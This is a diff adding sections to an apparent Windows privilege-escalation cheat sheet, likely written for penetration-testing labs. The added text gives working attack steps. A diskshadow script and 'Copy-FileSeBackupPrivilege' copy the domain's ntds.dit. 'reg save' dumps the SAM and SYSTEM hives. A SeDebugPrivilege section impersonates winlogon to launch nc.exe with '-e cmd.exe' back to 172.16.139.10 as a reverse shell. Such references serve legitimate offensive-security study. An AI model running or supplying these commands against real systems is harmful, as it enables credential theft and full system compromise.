@@ -357,10 +357,43 @@ GodPotato -cmd "cmd /c whoami"
 
 **SeBackupPrivilege**:
 https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
+https://github.com/k4sth4/SeBackupPrivilege
 ```shell
+To Retrieve files: (https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
 Import-Module .\Acl-FullControl.ps1
 Acl-FullControl -user vault\anirudh -path C:\Users\Administrator -
 type C:\Users\Administrator\Desktop\proof.txt
+
+To get ntds.dit
+### Create a vss.dsh file with the following content (In kali)
+set context persistent nowriters
+set metadata c:\\tools\\test.cab        
+set verbose on
+add volume c: alias test
+create
+expose %test% z:
+
+### Change the file format (In kali)
+unix2dos vss.dsh
+
+### Use diskshadow to explore the func of copy (In Windows)
+diskshadow /s c:\\tools\\vss.dsh
+
+### Now you can copy any file
+Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
+reg save HKLM\SAM C:\\programdata\\SAM
+reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
+```
+
+
+**SeDebugPrivilege**:
+https://github.com/decoder-it/psgetsystem
+```shell
+powershell -ep bypass
+Import-Module .\psgetsys.ps1
+Get-Module
+Get-Process winlogon
+ImpersonateFromParentPid -ppid 576 -command c:\tools\nc.exe -cmdargs "172.16.139.10 1235 -e cmd.exe"
 ```
 #### SAM, Security and System files
 
